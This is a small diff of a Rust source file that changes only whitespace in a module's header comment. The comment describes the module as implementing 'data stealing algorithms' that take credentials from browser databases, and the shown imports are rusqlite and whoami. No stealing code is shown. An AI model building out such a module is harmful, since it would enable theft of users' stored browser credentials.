@@ -1,10 +1,9 @@
 /**
  * Module contains classes that implement data stealing algorithms.
  * Such algorithms steal credentials from database and depends on browser.
- * 
+ *
  * Max A.Jurankov (astronmax) 2022
  */
-
 use rusqlite::Connection;
 use whoami;
 
